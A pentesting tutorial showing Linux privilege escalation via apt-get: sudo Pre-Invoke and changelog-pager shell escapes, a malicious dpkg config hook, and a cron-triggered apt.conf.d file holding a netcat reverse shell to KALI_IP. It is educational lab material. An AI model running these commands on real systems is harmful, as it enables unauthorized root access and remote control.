<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux for Pentester: APT Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2019-06-06T15:04:31+00:00">June 6, 2019</time><time class="updated" datetime="2025-05-10T20:33:12+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we’ll talk about APT (apt-get) functionality and learn how helpful the apt command is for Linux penetration testing and how we’ll progress apt to scale the greater privilege shell.</span></p>
<p><strong><em>Note: “The main objective of publishing the series of “Linux for pentester” is to introduce the circumstances and any kind of hurdles that can be faced by any pentester while solving CTF challenges or OSCP labs which are based on Linux privilege escalations. Here we do not criticizing any kind of misconfiguration that a network or system administrator does for providing higher permissions on any programs/binaries/files &amp; etc.”  </em></strong></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<p><span style="color: #000000;"><strong>Introduction to APT (apt-get)</strong></span></p>
<ul>
<li><span style="color: #000000;">Major Operation performed using APT (apt-get)</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting APT (apt-get)</strong></span></p>
<ul>
<li><span style="color: #000000;">Sudo Rights Lab setups for Privilege Escalation</span></li>
<li><span style="color: #000000;">Exploiting Sudo rights: Method -I</span></li>
<li><span style="color: #000000;">Exploiting Sudo rights: Method -II</span></li>
<li><span style="color: #000000;">Exploiting Sudo rights: Method -III</span></li>
<li><span style="color: #000000;">Crontab Lab setups for Privilege Escalation</span></li>
<li><span style="color: #000000;">Exploiting Cron job</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Introduction to </strong><strong>APT (apt-get)</strong></span></h3>
<p><span style="color: #000000;">The apt command is a powerful command-line tool, which works with Ubuntu’s Advanced Packaging Tool (APT) performing such functions as installation of new software packages, upgrade of existing software packages, updating of the package list index, and even upgrading the entire Ubuntu system.</span></p>
<p><span style="color: #000000;">Actions of the apt command, such as installation and removal of packages, are logged in the /var/log/dpkg.log log file.</span></p>
<p><span style="color: #000000;">For further information about the use of APT type:</span></p>
<pre class="lang:default decode:true">apt-get -h</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-XILgaXpEf6Y/XPko7B2qLjI/AAAAAAAAep4/qkIW06JUzQkfm8GEQRDTCOe_Fty6yo27ACLcBGAs/s1600/1.png"/></strong></span></p>
<h3><span style="color: #800000;"><strong>Major Operation performed using APT (apt-get)</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Update the Package:</strong> The APT package index is essentially a database of available packages from the repositories defined in the /etc/apt/sources.list file and in the /etc/apt/sources.list.d directory. To update the local package index with the latest changes made in the repositories, type the following:</span></li>
</ul>
<pre class="lang:default decode:true">apt-get update</pre>
<ul>
<li><span style="color: #000000;"><strong>Upgrade Packages:</strong> Over time, updated versions of packages currently installed on your computer may become available from the package repositories (for example security updates). To upgrade your system, first update your package index as outlined above, and then type:</span></li>
</ul>
<pre class="lang:default decode:true ">apt-get upgrade
apt-get dist-upgrade</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PYpG5MwhqHk/XPko9NC-T3I/AAAAAAAAeqU/6Pb4i4AzqugeZoJgwgKHuPhPXQMiwUFkQCLcBGAs/s1600/2.png"/></span></p>
<ul>
<li><span style="color: #000000;"><strong>Install a Package</strong>: we can Installation of packages using the apt tool which is quite easy. For example, to install the OpenSSH-server, type the following:</span></li>
</ul>
<pre class="lang:default decode:true">apt-get install openssh-server</pre>
<ul>
<li><span style="color: #000000;"><strong>Un-install a package: </strong>we can use remove command to un-install software packages without removing their configuration files.</span></li>
</ul>
<pre class="lang:default decode:true">apt-get remove openssh-server</pre>
<ul>
<li><span style="color: #000000;"><strong>Remove Installed packet: </strong>To remove software packages including their configuration files, use the ‘purge’ subcommand as shown below.</span></li>
</ul>
<pre class="lang:default decode:true">apt-get purge openssh-server</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-NrWComxdLWg/XPko9c1KXlI/AAAAAAAAeqY/rj_P-akZ_DQIJmkl1K9BfK-67Ih7hbHAACLcBGAs/s1600/3.png"/></strong></span></p>
<h3><span style="color: #800000;"><strong><u>Exploiting APT (apt-get)</u></strong></span></h3>
<h3><span style="color: #800000;"><strong>Sudo Rights Lab setups for Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">The behaviour of apt-get gets changed when running with higher privilege. Let’s suppose the system admin had given sudo permission to the local user to run apt-get. This is can be led to privilege escalation once the system is compromised.</span></p>
<p><span style="color: #000000;"><em>First all let’s revise what is sudo Permission?</em></span></p>
<p><span style="color: #000000;">In Linux/Unix, a sudoers file inside /etc is the configuration file for sudo rights. The word sudo represent <strong>S</strong>uper <strong>U</strong>ser Do Root privilege task. <strong>Sudoers</strong> file is that file where the users and groups with root privileges are stored to run some or all commands as root or another user.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-i3e7WAcjp3g/XPko9WPa0jI/AAAAAAAAeqc/JT5LWgHl3WUCoKEulTx4KyF37DJIiZooQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">So here, we had given sudo privilege to test user to run apt-get as root. To add sudo right open etc/sudoers file and type following as user Privilege specification.</span></p>
<pre class="lang:default decode:true">test   ALL=(ALL) NOPASSWD: /usr/bin/apt-get</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hTybpWPSx4Y/XPko-NTYwyI/AAAAAAAAeqg/XpbZ8Bx202cJjYbl3jAKYq63QhdFPsImwCLcBGAs/s1600/7.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploiting Sudo rights: Method -I</strong></span></h3>
<p><span style="color: #000000;">Let’s exploit apt-get service by abusing sudo user right. Suppose we had local user access of the targeted system and we want to escalate the root user rights.</span></p>
<p><span style="color: #000000;">So, first, we connect to the target machine with ssh and type following command to get access through local user login.</span></p>
<pre class="lang:default decode:true">ssh test@192.168.1.108</pre>
<p><span style="color: #000000;">Then we look for sudo right of “test” user (if given) and found that user “test” can execute the apt-get command as “root” (since he has ALL user’s right) without a password.</span></p>
<pre class="lang:default decode:true">sudo -l</pre>
<p><span style="color: #000000;">To exploit sudo right through apt service we just run the following command which will invoke bash for us with root privilege as shown in the below image.</span></p>
<pre class="lang:default decode:true">sudo apt-get update -o APT::Update::Pre-Invoke::= /bin/bash</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Xyyk67DAqGI/XPko-PHT9VI/AAAAAAAAeqk/_MDOiPtLEvc044vmd3twU-_iOOev0PucQCLcBGAs/s1600/8.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploiting Sudo rights: Method-II  </strong></span></h3>
<p><span style="color: #000000;">We may use apt-get for viewing changes in the packaged version of a project. We can, therefore, enter the following command in order to call a changelog, which dumps in the editor, like Man, data relating to changes to the source package.</span></p>
<pre class="lang:default decode:true">sudo apt-get changelog apt</pre>
<p><span style="color: #000000;">This will open the console like a Man editor to read the apt changelog, here we can inject “!/bin/sh” and press enter to execute bash shell for us.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--1j--gVbbZE/XPko-eN45yI/AAAAAAAAeqo/6MHcqL6h0D8byqpQ1Qv2PK7nK0qlyQsOgCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">You get “#” shell that means that we successfully escalated the root shell, as shown in the following picture.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ouMXu1qVOBY/XPko7KrL-kI/AAAAAAAAep8/nxBQPT9EfloRzTARZwrr3KxhIc17ruvVACLcBGAs/s1600/11.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploiting Sudo rights:  Method-III</strong></span></h3>
<p><span style="color: #000000;">We can use dpkg to construct a package instead of using apt-get to invoke bin/bash. We will first build a temp file, in which we construct a packaging to call /bin/bash, and then install the package via apt-get.</span></p>
<pre class="lang:default decode:true">TF=$(mktemp)
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' &gt; $TF
sudo apt-get install -c $TF sl</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Aktdu4AZ40g/XPko7eO1GLI/AAAAAAAAeqA/vRKKXQP4kpoagnFf9_kbdM9hkhArfEBhQCLcBGAs/s1600/12.png"/></span></p>
<h3><span style="color: #800000;"><strong>Crontab Lab setups for Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">This strategy is based upon a situation in which we assume that apt.conf.d can be written in order to plan a cronjob job to update the package with the command apt-get update. As we have said, we gave /adt-conf.d complete permission.</span></p>
<pre class="lang:default decode:true">chmod 777 apt.conf.d
ls -al</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-CNZcLllnMyk/XPko7srZSGI/AAAAAAAAeqE/qTONjD3kz3UwlvVqsSn-yUq3zrhUgNt4ACLcBGAs/s1600/13.png"/></strong></span></p>
<p><span style="color: #000000;">And then schedule the task using crontab to schedule an update of the software after 2 minutes every time as shown the below image</span></p>
<p><span style="color: #000000;"><strong>*/2 *     ***        root       apt-get update</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-O-J2vbSNA90/XPko8DiQ90I/AAAAAAAAeqM/XBoLsJUH8ksiCg-iosBVSN600NOV81HXwCLcBGAs/s1600/14.png"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Exploiting Cron job</span> </strong></span></h3>
<p><span style="color: #000000;">Let’s exploit apt-get service by abusing cron job as we all know cron job run as root. Suppose we had access to the targeted system locally and want the root user rights to enhanced limited shell access.</span></p>
<p><span style="color: #000000;">So, first we connect to the target machine with ssh and type following command:</span></p>
<pre class="lang:default decode:true">ssh test@192.168.1.108</pre>
<p><span style="color: #000000;">And we know <strong>apt.conf.d </strong>file has full permission as said above (You can also manually check to ensure the writable directory using find command) in the lab setup. Therefore, we will create a malicious file inside apt.conf.d by injecting netcat reverse backdoor:</span></p>
<pre class="lang:default decode:true">echo 'apt::Update::Pre-Invoke {“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc KALI_IP 1234 &gt;/tmp/f”};’ &gt; pwn</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vjTqOFtf0KI/XPko8IUQ0XI/AAAAAAAAeqI/UXbr6qnNg40oWg0qCo4w6pcLYIXfm5fuQCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Start the netcat listener to access the reverse connection of the host machine and wait for 2 minutes to obtain the privilege shell since apt-get update task is scheduled to update the packages every time, after minute through crontab that runs as root and it runs our netcat backdoor pwn to get reverse connections as depicted in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l0mBVKRAqig/XPko8W1HnrI/AAAAAAAAeqQ/ELKdB__n21Uq6DHgFX7PqBHHTOBQfXmAACLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;"><strong>References:</strong></span></p>
<p><span style="color: #000000;"><a style="color: #000000;" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></span></p>
<p><span style="color: #000000;"><a style="color: #000000;" href="https://help.ubuntu.com/lts/serverguide/apt.html.en">https://help.ubuntu.com/lts/serverguide/apt.html.en</a></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
